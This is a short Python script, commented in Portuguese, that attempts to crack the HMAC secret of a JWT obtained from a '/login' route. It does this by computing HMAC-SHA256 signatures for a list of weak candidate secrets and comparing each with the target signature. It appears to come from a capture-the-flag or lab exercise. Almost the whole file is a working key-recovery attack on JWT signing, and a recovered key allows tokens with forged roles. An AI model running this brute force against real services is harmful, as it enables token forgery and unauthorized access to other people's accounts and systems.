import hmac
import hashlib
import base64

def calcular_assinatura(dados: str, segredo: str) -> str:
    # Transforma as strings em bytes (UTF-8)
    dados_bytes = dados.encode('utf-8')
    segredo_bytes = segredo.encode('utf-8')
    
    # Calcula o HMAC-SHA256
    hash_bytes = hmac.new(segredo_bytes, dados_bytes, hashlib.sha256).digest()
    
    # Converte para Base64URL e remove os caracteres de padding '='
    assinatura_b64 = base64.urlsafe_b64encode(hash_bytes).decode('utf-8')
    return assinatura_b64.rstrip('=')

def main():
    # Dados do token obtido na rota /login para o usuário 'test'
    dados_para_assinar = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTc4MzA5Mjg4M30"
    assinatura_alvo = "4k1hI3Nu7KoTFywK0sQPXvsb2TOtmyiGJ9N5MTDaXMg"

    # Lista de padrões comuns definidos para verificação
    candidatos = [
        "123456",
        "password",
        "admin",
        "admin123",
        "root",
        "secret",
        "secret123",
        "supersecret",
        "jwt_secret",
        "SignedButBroken", 
        "signedbutbroken"
    ]

    print("Iniciando verificação de assinaturas...\n")
    chave_encontrada = None

    for tentativa in candidatos:
        try:
            assinatura_calculada = calcular_assinatura(dados_para_assinar, tentativa)
            
            # Exibe o log visual de cada comparação matemática
            print(f"Testando: [{tentativa}] -> Resultado: {assinatura_calculada}")

            if assinatura_calculada == assinatura_alvo:
                chave_encontrada = tentativa
                break
        except Exception as e:
            print(f"Erro ao processar chave '{tentativa}': {e}")

    print("\n--------------------------------------------------")
    if chave_encontrada:
        print(f"[+] SUCESSO! A chave correspondente é: {chave_encontrada}")
    else:
        print("[-] Nenhuma das chaves fornecidas gerou a assinatura alvo.")
    print("--------------------------------------------------")

if __name__ == "__main__":
    main()